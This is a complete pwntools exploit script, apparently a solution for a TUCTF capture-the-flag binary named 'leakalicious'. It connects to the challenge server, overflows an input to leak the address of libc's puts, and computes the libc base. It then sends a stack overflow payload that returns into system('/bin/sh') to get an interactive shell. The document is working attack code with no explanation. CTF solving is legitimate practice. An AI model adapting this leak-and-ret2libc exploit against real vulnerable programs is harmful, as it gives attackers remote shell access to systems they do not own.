# https://libc.blukat.me/

from pwn import *

# context.terminal=['tmux', 'splitw', '-h']
# codebase = 0x555555554000

LOCAL = False

elfpath = './leakalicious'
# libcpath = '/lib/x86_64-linux-gnu/libc.so.6'
libcpath = '/lib/i386-linux-gnu/libc.so.6'
if __name__ == '__main__':
    if LOCAL:
        s = process(elfpath)
    else:
        s = remote('chal.tuctf.com', 30505)
    elf = ELF(elfpath)
    libc = ELF(libcpath)
    script = '''
    c
    '''
    if len(sys.argv) == 2: gdb.attach(s, script)

    print s.sendlineafter('> ', 'A'*31)
    libc.address = u32(s.recvuntil('What').split('\n')[1][:4]) - libc.symbols['puts']
    log.info('libc base : ' + hex(libc.address))
    s.sendline('AAAA')

    payload = 'A'*0x28
    payload += 'B'*4
    payload += p32(libc.symbols['system'])
    payload += 'CCCC'
    payload += p32(next(libc.search('/bin/sh')))

    s.sendline(payload)
    s.interactive()
    s.close()
